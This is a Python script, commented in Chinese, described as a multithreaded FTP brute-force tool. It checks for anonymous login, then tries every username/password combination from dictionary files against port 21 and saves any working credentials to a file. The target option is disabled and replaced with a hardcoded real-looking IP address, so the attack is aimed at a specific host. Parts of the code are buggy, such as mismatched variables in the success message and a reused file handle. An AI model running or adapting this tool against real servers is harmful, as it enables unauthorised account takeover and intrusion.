import ftplib
import threading
from optparse import OptionParser
import queue
import sys


# 编写匿名登录函数
def checkanonymous(ip):
    try:
        f = ftplib.FTP()
        print("开始检查是否允许匿名用户登录！")
        f.connect(ip, 21)
        f.login()  # 匿名登录时，不需要带参数
        print("匿名登录成功！")
        f.close()
        sys.exit(0)
    except ftplib.all_errors:
        print("匿名登录失败！")
        print("开始尝试暴力破解登录！")
        pass


def FTPbrute(ip, q):
    while not q.empty():
        str = q.get()
        username_passwd = str.split("|")
        ftp_username = username_passwd[0]
        ftp_passwd = username_passwd[1]
        f = ftplib.FTP()
        try:
            f.connect(ip, 21)
            f.login(ftp_username, ftp_passwd)
            print("成功！>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>用户名为：{} 密码为：{}".format(username, passwd))
            # 若破解成功，则把用户名和密码保存在“ftp用户名和密码.txt”文件中
            with open("ftp用户名和密码.txt", "w") as f:
                f.write("用户名：" + ftp_username + " " + "密码：" + ftp_passwd)
            f.close()
            sys.exit(0)
        except ftplib.all_errors:
            print("{}/{}不正确！".format(ftp_username, ftp_passwd))
            f.close()
            pass


if __name__ == '__main__':
    parser = OptionParser(usage="使用方法:%prog -p 'ip地址' -t '线程数' -u '用户名字典' -f '密码字典'", version="%prog 1.0", description="多线程FTP爆破脚本")
    parser.add_option("-p", "--IP", action="store", dest="ip", help="目标ip")
    parser.add_option("-t", "--thread", action="store", dest="thread_nums", type="int", help="扫描时的线程数")
    parser.add_option("-f", "--passFile", action="store", dest="passFile", help="爆破时所需要的密码字典文件")
    parser.add_option("-u", "--userFile", action="store", dest="userFile", help="爆破时所需要的用户名字典文件")
    (options, args) = parser.parse_args()
    thread_nums = options.thread_nums
    # 修改了 一下
    #ip = options.ip
    ip = '210.44.172.251'
    passFile = options.passFile
    userFile = options.userFile
    # 初始化队列
    q = queue.Queue(maxsize=0)
    checkanonymous(ip)
    username = open(userFile, "r", encoding="utf-8")
    passwd = open(passFile, "r", encoding="utf-8")
    list_useranme = []
    list_passwd = []
    for u in username:
        list_useranme.append(u.replace("\n", ""))
    for p in passwd:
        list_passwd.append(p.replace("\n", ""))
    for u in list_useranme:
        for p in list_passwd:
            q.put(u + "|" + p)
    username.close()
    passwd.close()

    for nums in range(int(thread_nums)):
        t = threading.Thread(target=FTPbrute, args=(ip, q))
        t.start()